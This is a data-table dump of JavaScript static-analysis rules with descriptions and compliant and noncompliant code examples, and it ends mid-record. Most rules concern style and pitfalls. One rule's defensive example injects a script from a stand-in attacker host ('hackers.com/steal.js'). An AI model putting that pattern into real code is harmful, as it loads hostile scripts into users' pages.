812	Trailing commas should not be used	TrailingComma	\N	javascript	<p>\n  Most browsers parse and discard a meaningless, trailing comma. Unfortunately, that's not the case for Internet Explorer below version 9, which throws a meaningless error. Therefore trailing commas should be eliminated.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nvar settings = {\n    'foo'  : oof,\n    'bar' : rab,    // Noncompliant - trailing comma\n};\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar settings = {\n    'foo'  : oof,\n    'bar' : rab\n};\n</pre>	4	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	cross-browser	f	HTML	1511453807416	1511453807417	1
866	Untrusted content should not be included	S2611	\N	javascript	<p>Including content in your site from an untrusted source can expose your users to attackers and even compromise your own site. For that reason, this rule raises an issue for each non-relative URL.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nfunction include(url) {\n  var s = document.createElement("script");\n  s.setAttribute("type", "text/javascript");\n  s.setAttribute("src", url);\n  document.body.appendChild(s);\n}\ninclude("http://hackers.com/steal.js")  // Noncompliant\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/829">MITRE, CWE-829</a> - Inclusion of Functionality from Untrusted Control Sphere\n</li><li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Risky Resource Management\n</li></ul>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cwe,sans-top25-risky	f	HTML	1511453807479	1511453807479	3
813	Class methods should be used instead of "prototype" assignments	S3525	\N	javascript	<p>Originally JavaScript didn't support <code>class</code>es, and class-like behavior had to be kludged using things like <code>prototype</code> assignments for "class" functions.\n  Fortunately, ECMAScript 2015 added classes, so any lingering <code>prototype</code> uses should be  converted to true <code>class</code>es. The new syntax is more expressive and clearer, especially to those with experience in other languages.</p>\n<p>Specifically, with ES2015, you should simply declare a <code>class</code> and define its methods inside the class declaration.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction MyNonClass(initializerArgs = []) {\n  this._values = [...initializerArgs];\n}\n\nMyNonClass.prototype.doSomething = function () {  // Noncompliant\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass {\n  constructor(initializerArgs = []) {\n    this._values = [...initializerArgs];\n  }\n\n  doSomething() {\n    //...\n  }\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	es2015	f	HTML	1511453807417	1511453807417	1
814	Element type selectors should not be used with class selectors	S2714	\N	javascript	<p>Using element type in class selectors is slower than using only the class selector.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>var $products = $("div.products");    // Noncompliant - slow</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>var $products = $(".products");    // Compliant - fast</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	jquery,performance,user-experience	f	HTML	1511453807418	1511453807419	1
815	JQuery cache variables should comply with a convention name	S2713	\N	javascript	<p>Shared naming conventions allow teams to collaborate efficiently.\n  This rule checks that all variables names that are used to store/cache jQuery objects match a provided regular expression.</p>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention,jquery	f	HTML	1511453807419	1511453807419	1
816	Universal selectors should not be used	S2716	\N	javascript	<p>\n  Element selections that could be matched anywhere in the document can be very slow. That's why use of the universal selector, <code>*</code>, should be limited; it explicitly\n  specifies that the match could be anywhere.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>$( ".buttons > *" );  // Noncompliant; extremely expensive</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>$( ".buttons" ).children(); // Compliant</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	jquery,performance,user-experience	f	HTML	1511453807422	1511453807422	1
817	Constructor functions should not be called purely for side-effects	ConstructorFunctionsForSideEffects	\N	javascript	<p>Some people like to call a constructor functions without assigning the result to a variable. There is no advantage in this approach since the object the <code>new</code> operator creates isn't used anywhere. Therefore this misleading syntax should be avoided.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nnew MyConstructor(); // Non-Compliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nvar something = new MyConstructor();  // Compliant\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807423	1511453807423	1
818	"find" should be used to select the children of an element known by id	S2715	\N	javascript	<p>\n  The use of <code>find</code> allows <code>document.getElementById()</code> to be used for the top-level selection, and saves the Sizzle engine for where it's really needed.\n  That makes the query faster, and your application more responsive.\n</p>\n<p>From the jQuery documentation:</p>\n\n<blockquote>\n  Beginning your selector with an ID is always best.<br>\n  The <code>.find()</code> approach is faster because the first selection is handled without going through the Sizzle selector engine – ID-only selections are handled using <code>document.getElementById()</code>,\n  which is extremely fast because it is native to the browser.\n</blockquote>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>var $productIds = $("#products div.id"); // Noncompliant - a nested query for Sizzle selector engine</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>var $productIds = $("#products").find("div.id"); // Compliant - #products is already selected by document.getElementById() so only div.id needs to go through Sizzle selector engine</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	jquery,performance,user-experience	f	HTML	1511453807424	1511453807424	1
821	"defaults" should be a function when objects or arrays are used	S2550	\N	javascript	<p>\n  When using the Backbone.js framework, model <code>defaults</code> should be a function rather than an object if it contains arrays or objects. This is because objects and arrays are passed by reference in JavaScript. So a <code>defaults</code> object that contains arrays or objects is going to set the default value of every instance to point to the same shared object or array.\n</p>\n<p>\n  Use a function instead and a fresh copy of the object or array will be peeled off for each instance.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar Person = Backbone.Model.extend({\n  defaults: {  // Noncompliant; every instance of Person will share the same instance of favoriteColors\n    favoriteColors: ["blue","purple","raspberry"]\n  }\n});\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar Person = Backbone.Model.extend({\n  defaults: function() {\n    return {\n      favoriteColors: ["blue","purple","raspberry"]\n    };\n  }\n});\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	backbone	f	HTML	1511453807427	1511453807428	2
822	Loop counters should not be assigned to from within the loop body	S2310	\N	javascript	<p>Loop counters should not be modified in the body of the loop. However other loop control variables representing logical values may be modified in the loop, for example a flag to indicate that something has been completed, which is then tested in the for statement.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar names = [ "Jack", "Jim", "", "John" ];\nfor (var i = 0; i &lt; names.length; i++) {\n  if (!names[i]) {\n    i = names.length;                                 // Non-Compliant\n  } else {\n    console.log(names[i]);\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar names = [ "Jack", "Jim", "", "John" ];\nfor (var name of names) {\n  if (!name) {\n    break;                                 // Compliant\n  } else {\n    console.log(name);\n  }\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807429	1511453807429	1
823	Comparison operators should not be used with strings	S3003	\N	javascript	<p>The use of comparison operators (<code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>&gt;</code>) with strings is not likely to yield the expected results. Instead, try converting at least one operand to the <code>number</code> type.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar appleNumber = "123";\nvar orangeNumber = "45";\nif (appleNumber &lt; orangeNumber) {  // Noncompliant, this condition is true\n  alert("There are more oranges");\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar appleNumber = "123";\nvar orangeNumber = "45";\nif (Number(appleNumber) &lt; Number(orangeNumber)) {\n  alert("There are more oranges");\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	suspicious	f	HTML	1511453807429	1511453807430	1
824	Expressions should not be too complex	S1067	\N	javascript	<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code> operators it contains.</p>\n<p>A single expression's complexity should not become too high to keep the code readable.</p>	2	\N	READY	js	\N	\N	\N	\N	\N	LINEAR_OFFSET	\N	1min	\N	5min	per complexity point above the threshold	\N	brain-overload	f	HTML	1511453807430	1511453807431	1
825	Unary operators "+" and "-" should not be used with objects	S3002	\N	javascript	<p>\n  The unary operators <code>+</code> and <code>-</code> can be used to convert some value types to numeric values.\n  But not every value can be converted to a <code>Number</code> type: use it with an object, and result will be always <code>NaN</code> (Not A Number).\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nvar obj = {x : 1};\ndoSomethingWithNumber(+obj);    // Noncompliant\n\nfunction foo(){\n  return 1;\n}\ndoSomethingWithNumber(-foo);    // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nvar obj = {x : 1};\ndoSomethingWithNumber(+obj.x);\n\nfunction foo(){\n  return 1;\n}\ndoSomethingWithNumber(-foo());\n\nvar str = '42';\ndoSomethingWithNumber(+str);\n</pre>\n\n<h2>Exceptions</h2>\n\n<p>Unary <code>+</code> and <code>-</code> can be used with objects corresponding to primitive types.</p>\n\n<pre>\nvar b = new Boolean(true);\ndoSomethingWithNumber(-b);  // Compliant\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	\N	f	HTML	1511453807434	1511453807435	2
826	Array and Object constructors should not be used	ArrayAndObjectConstructors	\N	javascript	<p>\n  Array and Object literals should always be preferred to Array and Object constructors.\n</p>\n\n<p>\n  Array constructors are error-prone due to the way their arguments are interpreted. If more than one argument is used, the array length will be equal to the number of arguments. However, using a single argument will have one of three consequences:\n</p>\n\n<ul>\n    <li>If the argument is a number and it is a natural number the length will be equal to the value of the argument.</li>\n    <li>If the argument is a number, but not a natural number an exception will be thrown.</li>\n    <li>Otherwise the array will have one element with the argument as its value.</li>\n</ul>\n\n<p>\n  For these reasons, if someone changes the code to pass 1 argument instead of 2 arguments, the array might not have the expected length. To avoid these kinds of weird cases, always use the more readable array.\n</p>\n\n<p>\n  Object constructors don't have the same problems, but for readability and consistency object literals should be used.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar a3 = new Array(x1); // Noncompliant and variable in results\nvar a4 = new Array();  // Noncompliant. Results in 0-element array.\nvar a1 = new Array(x1, x2, x3);  // Noncompliant. Results in 3-element array.\n\nvar o = new Object(); // Noncompliant\n\nvar o2 = new Object(); // Noncompliant\no2.a = 0;\no2.b = 1;\no2.c = 2;\no2['strange key'] = 3;\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar a = [x1, x2, x3];\nvar a2 = [x1, x2];\nvar a3 = [x1];\nvar a4 = [];\n\nvar o = {};\n\nvar o2 = {\n  a: 0,\n  b: 1,\n  c: 2,\n  'strange key': 3\n};\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807436	1511453807436	2
827	Functions should not have too many parameters	ExcessiveParameterList	\N	javascript	<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many things.</p>\n\n<h2>Noncompliant Code Example</h2>\nThe following code snippet illustrates this rule with a maximum number of 4 parameters:\n<pre>\nfunction doSomething(param1, param2, param3, param4, param5) { \n...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(int param1, int param2, int param3, String param4) {\n...\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	brain-overload	f	HTML	1511453807437	1511453807437	1
828	Setters should not return values	S2432	\N	javascript	Functions declared with the <code>set</code> keyword will automatically return the values they were passed. Thus any value explicitly returned from a setter will be ignored, and explicitly returning a value is an error.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar person = {\n  // ...\n  set name(name) {\n    this.name = name;\n    return 42;  // Noncompliant\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar person = {\n  // ...\n  set name(name) {\n    this.name = name;\n  }\n}\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807443	1511453807443	2
832	Related "if/else if" statements and "cases" in a "switch" should not have the same condition	S1862	\N	javascript	<p>\n  A <code>switch</code> and a chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first one with a condition that evaluates to <code>true</code>.\n</p>\n<p>\n  Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior.\n</p>\n\n<p>\nFor a <code>switch</code>, if the first case ends with a break, the second case will never be executed, rendering it dead code. Worse there is the risk in this situation that future maintenance will be done on the dead case, rather than on the one that's actually used.\n</p>\n\n<p>\nOn the other hand, if the first case does not end with a break, both cases will be executed, but future maintainers may not notice that.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (param == 1)\n  openWindow();\nelse if (param == 2)\n  closeWindow();\nelse if (param == 1)  // Noncompliant\n  moveWindowToTheBackground();\n\nswitch(i) {\n  case 1:\n    //...\n    break;\n  case 3:\n    //...\n    break;\n  case 1:  // Noncompliant\n    //...\n    break;\n  default:\n    // ...\n    break;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (param == 1)\n  openWindow();\nelse if (param == 2)\n  closeWindow();\nelse if (param == 3)\n  moveWindowToTheBackground();\n\nswitch(i) {\n  case 1:\n    //...\n    break;\n  case 3:\n    //...\n    break;\n  default:\n    // ...\n    break;\n}\n</pre>\n\n<h2>See</h2>\n  <ul>\n    <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect </li>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a>- Detect and remove code that has no effect </li>\n  </ul>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cert,pitfall,unused	f	HTML	1511453807449	1511453807450	2
833	Strings and non-strings should not be added	S3402	\N	javascript	<p>Use a <code>+</code> with two numbers and you'll get addition. But use it with a string and anything else, and you'll get concatenation. Very often that's not what's intended, and even when it is, it's likely to confuse future maintainers. </p>\n<p>Since this may not be what's intended, this rule raises an issue when <code>+</code> is used with a string and a non-string.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar a = '42';\nvar b = 5;\nvar sum = a + b;          // Noncompliant; yields string "425"\n\nvar foo = ' is a lucky number';\nalert(42 + foo);          // Noncompliant; make your intention explicit\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar a = '42';\nvar b = 5;\nvar sum = parseInt(a) + b; // Compliant; yields 47\n\nvar foo = ' is a lucky number';\nalert('' + 42 + foo);     // Use an empty string literal\nalert(`${42}${foo}`);     // Use template strings; available since ES2015\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	suspicious	f	HTML	1511453807451	1511453807451	1
834	Unused local variables should be removed	UnusedVariable	\N	javascript	<p>\n  If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will not wonder what the variable is used for.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction numberOfMinutes(hours) {\n  var seconds = 0;   // seconds is never used\n  return hours * 60;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfunction numberOfMinutes(hours) {\n  return hours * 60;\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	unused	f	HTML	1511453807451	1511453807451	1
835	Control structures should always use curly braces	CurlyBraces	\N	javascript	<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\n// the two statements seems to be attached to the if statement, but that is only true for the first one:\nif (condition)\n  executeSomething();\n  checkSomething();\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif (condition) {\n  executeSomething();\n  checkSomething();\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 14.8 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement</li>\n<li> MISRA C:2004, 14.9 - An if (expression) construct shall be followed by a compound statement. The else keyword shall be followed by either a compound statement, or another if statement</li>\n<li> MISRA C++:2008, 6-3-1 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement</li>\n<li> MISRA C++:2008, 6-4-1 - An if (condition) construct shall be followed by a compound statement. The else keyword shall be followed by either a compound statement, or another if statement</li>\n<li> MISRA C:2012, 15.6 - The body of an iteration-statement or a selection-statement shall be a compound-statement</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/1QGMAg">CERT, EXP19-C</a> - Use braces for the body of an if, for, or while statement</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/483.html">MITRE, CWE-483</a> - Incorrect Block Delimitation</li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert,cwe,misra,pitfall	f	HTML	1511453807452	1511453807452	1
836	Cross-document messaging domains should be carefully restricted	S2819	\N	javascript	<p>\n  HTML5 adds the ability to send messages to documents served from other domains. To mitigate the risk of sending sensitive information to a document served from a hostile or\n  unknown domain, this rule raises an issue each time <code>Window.postMessage</code> is used.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nvar myWindow = document.getElementById('myIFrame').contentWindow;\nmyWindow.postMessage(message, "*"); // Noncompliant; how do you know what you loaded in 'myIFrame' is still there?\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li><a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)">OWASP Top Ten 2013 Category A3</a> - Cross-Site Scripting (XSS)</li>\n</ul>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	html5,owasp-a3	f	HTML	1511453807453	1511453807453	3
837	Wrapper objects should not be used for primitive types	PrimitiveWrappers	\N	javascript	<p>\n  The use of wrapper objects for primitive types is gratuitous, confusing and dangerous. Simple literals should be used instead.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar x = new Boolean(false);\nif (x) {\n  alert('hi');  // Shows 'hi'.\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar x = false;\nif (x) {\n  alert('hi');\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	pitfall	f	HTML	1511453807454	1511453807454	1
838	Each statement should end with a semicolon	Semicolon	\N	javascript	<p>In JavaScript, the semicolon (<code>;</code>) is optional as a statement separator, but omitting semicolons can be confusing, and lead to unexpected results because a semicolon is implicitly inserted at the end of each line.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nfunction fun() {\n  return  // Noncompliant. ';' implicitly inserted at end of line\n       5   // Noncompliant. ';' implicitly inserted at end of line\n}\nprint(fun());  // prints "undefined", not "5"\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nfunction fun() {\n  return 5;\n}\nprint(fun());\n</pre>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453807454	1511453807455	1
839	Dead Stores should be removed	S1854	\N	javascript	<p>\n  A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value only to then overwrite it or\n  throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources. Therefore all calculated values should be used.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nfunction pow(a, b) {\n  if(b == 0) {\n    return 0;\n  }\n  var x = a;\n  for(var i = 1, i < b, i++) {\n    x = x * a;  //Dead store because the last return statement should return x instead of returning a\n  }\n  return a;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nfunction pow(a, b) {\n  if(b == 0) {\n    return 0;\n  }\n  var x = a;\n  for(var i = 1, i < b, i++) {\n    x = x * a;\n  }\n  return x;\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li><a href="http://cwe.mitre.org/data/definitions/563.html">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable')</li>\n  <li><a href="https://www.securecoding.cert.org/confluence/x/QYA5">CERT, MSC13-C</a> - Detect and remove unused values</li>\n  <li><a href="https://www.securecoding.cert.org/confluence/x/S4IyAQ">CERT, MSC13-CPP</a> - Detect and remove unused values</li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cert,cwe,unused	f	HTML	1511453807455	1511453807455	2
840	Destructuring syntax should be used for assignments	S3514	\N	javascript	<p>ECMAScript 2015 introduced the ability to extract and assign multiple data points from an object or array simultaneously. This is called "destructuring", and it allows you to condense boilerplate code so you can concentrate on logic. </p>\n<p>This rule raises an issue when multiple pieces of data are extracted out of the same object or array and assigned to variables.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction foo (obj1, obj2, array) {\n  var a = obj1.a;  // Noncompliant\n  var b = obj1.b;\n\n  var name = obj2.name;  // ignored; there's only one extraction-and-assignment\n\n  var zero = array[0];  // Noncompliant\n  var one = array[1];\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfunction foo (obj1, obj2, array) {\n  var {a, b} = obj1;\n\n  var {name} = obj2;  // this syntax works because var name and property name are the same\n\n  var [zero, one] = array;\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy,es2015	f	HTML	1511453807456	1511453807456	1
841	The "changed" property should not be manipulated directly	S2549	\N	javascript	<p>According to the Backbone.js docs</p>\n\n<blockquote>\n  The <strong>changed</strong> property is the internal hash containing all the attributes that have changed since the last set. Please do not update <strong>changed</strong> directly since its state is\n  internally maintained by set. A copy of <strong>changed</strong> can be acquired from changedAttributes.\n</blockquote>\n\n<p>\n  The <code>changed</code> property is involved in decisions about whether or not a collection should be resorted when it is updated.\n  If you modify it manually, you can break the resorting of the collection.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nmyModel.changed = { myProperty: 1 }; // Non-compliant\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	backbone	f	HTML	1511453807457	1511453807457	2
842	HTML-style comments should not be used	HtmlComments	\N	javascript	<p>\n  HTML-style comments are not part of EcmaScript specification, and should not be used.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n&lt;!-- Noncompliant -->\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n// Compliant\n/* Compliant */\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807457	1511453807458	2
873	Wildcard imports should not be used	S2208	\N	javascript	<p>On the principle that clearer code is better code, you should explicitly <code>import</code> the things you want to use in a module. Using <code>import *</code> imports everything in the module, and runs the risk of confusing maintainers. Similarly, <code>export * from "module";</code> imports and then re-exports everything in the module, and runs the risk of confusing not just maintainers but also users of the module.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport * as Imported from "aModule";  // Noncompliant\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	es2015,pitfall	f	HTML	1511453807486	1511453807487	1
843	Variables should be declared explicitly	S2703	\N	javascript	<p>JavaScript variable scope can be particularly difficult to understand and get right. The situation gets even worse when you consider the <em>accidental</em> creation of global\n  variables, which is what happens when you declare a variable inside a function or the <code>for</code> clause of a for-loop without using the <code>let</code>,\n  <code>const</code> or <code>var</code> keywords. </p>\n\n<p><code>let</code> and <code>const</code> were introduced in ECMAScript 2015, and are now the preferred keywords for variable declaration.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction f(){\n  i = 1;         // Noncompliant; i is global\n\n  for (j = 0; j &lt; array.length; j++) {  // Noncompliant; j is global now too\n    // ...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfunction f(){\n  var i = 1;\n\n  for (let j = 0; j &lt; array.length; j++) {\n    // ...\n  }\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	pitfall	f	HTML	1511453807458	1511453807459	1
844	"===" and "!==" should be used instead of "==" and "!="	EqEqEq	\N	javascript	<p>The <code>==</code> and <code>!=</code> operators do type coercion before comparing values. This is bad because it can mask type errors. For example, it evaluates <code>' \\t\\r\\n' == 0</code> as <code>true</code>.</p>\n<p>It is best to always use the side-effect-less <code>===</code> and <code>!==</code> operators instead.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif (var == 'howdy') {...} // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif (var === 'howdy') {...}\n</pre>\n<h2>Exceptions</h2>\n\n<p>Even if testing the equality of a variable against null doesn't do exactly what most JavaScript developers believe, usage of <code>==</code> or <code>!=</code> is tolerated in such context. In the following case, if <code>foo</code> hasn't been initialized, its default value is not <code>null</code> but <code>undefined</code>. Nevertheless <code>undefined == null</code>, so JavaScript developers get the expected behavior.</p>\n<pre>\nif(foo == null) {...}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807460	1511453807460	2
845	The base should be provided to "parseInt"	S2427	\N	javascript	<p>The <code>parseInt</code> function has two versions, one that takes a base value as a second argument and one that does not, and using the single-arg version can result in unexpected results on older browsers. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nparseInt("010");  // Noncompliant; pre-2013 browsers may return 8 \n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nparseInt("010", 10);\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	\N	f	HTML	1511453807461	1511453807461	2
846	Nested blocks of code should not be left empty	EmptyBlock	\N	javascript	<p>\n  Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (var i = 0; i < length; i++) {}  // Empty on purpose or missing piece of code ?\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n  When a block contains a comment, this block is not considered to be empty.\n</p>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807461	1511453807462	2
847	Only "while", "do" and "for" statements should be labelled	LabelPlacement	\N	javascript	<p>Any statement or block of statements can be identified by a label, but those labels should be used only on 'while', 'do-while' and 'for' statements. Using labels in any other context leads to unstructured, confusing code. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nmyLabel:if (i % 2 == 0) {  // Noncompliant\n  if (i == 12) {\n    print("12");\n    break myLabel;\n  }\n  print("Odd number, but not 12");\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nmyLabel:for (i = 0; i &lt; 10; i++) {   // Compliant\n  print("Loop");\n  break myLabel;\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	pitfall	f	HTML	1511453807462	1511453807462	1
874	Collapsible "if" statements should be merged	CollapsibleIfStatements	\N	javascript	<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif (x != undefined) {\n  if (x === 2) {\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif (x != undefined &amp;&amp; x === 2) {\n  // ...\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453807487	1511453807487	1
848	"switch" statements should not contain non-case labels	S1219	\N	javascript	<p>Even if it is legal, mixing case and non-case labels in the body of a switch statement is very confusing and can even be the result of a typing error.</p>\n<h2>Noncompliant Code Examples</h2>\n\n<p>Case 1, the code is syntactically correct but the behavior is not the expected one</p>\n<pre>\nswitch (day) {\n  case MONDAY:\n  case TUESDAY:\n  WEDNESDAY:   // instead of "case WEDNESDAY"\n    doSomething();\n    break;\n  ...\n}\n</pre>\n<p>Case 2, the code is correct and behaves as expected but is hardly readable </p>\n<pre>\nswitch (day) {\n  case MONDAY:\n    break;\n  case TUESDAY:\n    foo:for(i = 0 ; i &lt; X ; i++) {\n         /* ... */\n        break foo;  // this break statement doesn't relate to the nesting case TUESDAY\n         /* ... */\n    }\n    break;\n    /* ... */\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<p>Case 1</p>\n<pre>\nswitch (day) {\n  case MONDAY:\n  case TUESDAY:\n  case WEDNESDAY:\n    doSomething();\n    